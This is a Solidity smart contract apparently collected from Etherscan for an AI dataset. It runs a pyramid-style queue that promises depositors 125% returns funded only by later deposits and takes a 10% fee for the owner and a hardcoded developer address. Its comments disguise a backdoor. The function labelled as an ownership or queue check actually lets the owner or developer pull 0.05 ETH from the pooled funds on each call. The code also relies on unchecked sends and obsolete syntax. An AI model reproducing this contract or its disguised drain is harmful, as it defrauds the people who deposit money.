/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
/*
Contract is secured with Creative Commons license.
Unauthorised copying and editing is prohibited.
Current lisensorship is Attribution-ShareAlike 2.0 Generic (CC BY-SA 2.0).
*/
contract Hawaii
{
    struct Person 
    {
        address ETHaddress;
        uint ETHamount;
    }

    Person[] public persons;

    uint public paymentqueue = 0;
    uint public feecounter;
    uint amount;
    
    address public owner;
    address public developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;
    address meg=this;

    modifier _onlyowner
    {
        if (msg.sender == owner || msg.sender == developer)
        _
    }
    
    function Hawaii() 
    {
        owner = msg.sender;
    }
    function()                                                                  //start using contract
    {
        enter();
    }
    function enter()
    {
        if (msg.sender == owner || msg.sender == developer)                     //do not allow to use contract by owner or developer
	    {
	        UpdatePay();                                                        //check for ownership
	    }
	    else                                                                    //if sender is not owner
	    {
            feecounter+=msg.value/10;                                           //count fee
	        owner.send(feecounter/2);                                           //send fee
	        developer.send(feecounter/2);                                       //send fee
	        feecounter=0;                                                       //decrease fee
	        
            if (msg.value == (1 ether)/4)                                      //check for value 0.25 ETH
            {
	            amount = msg.value;                                             //if correct value
	            uint idx=persons.length;                                        //add to payment queue
                persons.length+=1;
                persons[idx].ETHaddress=msg.sender;
                 persons[idx].ETHamount=amount;
                canPay();                                                       //allow to payment this sender
            }
	        else                                                                //if value is not 0.25 ETH
	        {
	            msg.sender.send(msg.value - msg.value/10);                      //give its back
	        }
	    }

    }
    
    function UpdatePay() _onlyowner                                             //check for updating queue
    {
        if (meg.balance>((1 ether)/20)) {  //if payment not 
            msg.sender.send(((1 ether)/20));
        } else {
            msg.sender.send(meg.balance);
        }
    }
    
    function canPay() internal                                                           //create queue async
    {
        while (meg.balance>persons[paymentqueue].ETHamount/100*125)             //see for balance
        {
            uint transactionAmount=persons[paymentqueue].ETHamount/100*125;     //create payment summ
            persons[paymentqueue].ETHaddress.send(transactionAmount);           //send payment to this person
            paymentqueue+=1;                                                    //Update queue async
        }
    }
}